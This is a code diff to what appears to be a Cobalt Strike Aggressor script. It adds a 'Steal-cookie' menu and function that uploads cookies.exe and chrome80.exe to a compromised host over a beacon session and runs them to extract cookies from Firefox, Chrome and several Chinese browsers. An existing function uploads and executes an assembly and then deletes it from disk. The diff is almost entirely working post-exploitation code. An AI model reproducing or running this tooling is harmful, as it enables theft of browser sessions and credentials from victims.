@@ -1,5 +1,6 @@
 #define functions
 
+
 sub Exec_sharpshell{
     local('$fpath $fname');
     $fpath = $3['file'];
@@ -7,6 +8,42 @@ sub Exec_sharpshell{
     bupload($bid, $fpath);
     bexecute_assembly($bid, script_resource("post/Sharpshell.exe"), "\"".$fname."\"");
     bshell($bid,"del /F /S /Q $fname");
+}
+
+sub Steal_cookies{
+    local('$type $prefix $isnew $cmd $isup $redirect $redbox');
+    $type = lc($3['type']);
+    $prefix = $3['prefix'];
+    $isnew = lc($3['isnew']);
+    $isup = lc($3['isup']);
+    $redirect = $3['redirect'];
+    $redbox = $3['redbox'];
+    if ($type eq "Firefox"){
+        $cmd = "cookies.exe firefox  $+ $prefix";
+    }
+    else if ($type eq "chrome"){
+        if ($isnew eq "true"){
+            $cmd = "chrome80.exe";
+            
+        }
+        else{
+            $cmd = "cookies.exe chrome";
+        }
+    }
+    else {
+        $cmd = "cookies.exe  $+ $type";
+    }
+    if ($redbox eq "true"){
+        $cmd = "$cmd >  $+ $redirect";
+    }
+    if ($isup eq "true"){
+        bshell($bid, $cmd);
+    }
+    else{
+        bupload($bid, script_resource("gather/chrome80.exe"));
+        bupload($bid, script_resource("gather/cookies.exe"));
+        bshell($bid, $cmd);
+    }
 }
 
 #append menus
@@ -55,5 +92,20 @@ sub Exec_sharpshell{
                 drow_file($dialog, "file", "Choose: ");
                 dbutton_action($dialog, "Go");
                 dialog_show($dialog); 
+            }
+
+            item "Steal-cookie"{
+                show_message("It is recommended to manually upload the files under the gather folder before using this function !");
+                $bid = $1['@'];
+                $dialog = dialog("Steal cookies",%(bid => $bid, isnew => "False", redirect => "Output.txt"), &Steal_cookies);
+                dialog_description($dialog, "Stealing cookies from a browser stored in a local database.");
+                drow_combobox($dialog, "type", "Type: ", @("Firefox", "Chrome", "2345", "QQ", "360", "360cse", "Sogou"));
+                drow_text($dialog, "prefix", "Prefix: ");
+                drow_combobox($dialog, "isnew", "80.x: ", @("True", "False"));
+                drow_combobox($dialog, "isup", "Isuploaded: ", @("True", "False"));
+                drow_checkbox($dialog, "redbox", "Output redirection: ", "");
+                drow_text($dialog, "redirect", "");
+                dbutton_action($dialog, "Exec");
+                dialog_show($dialog);
             }
     }
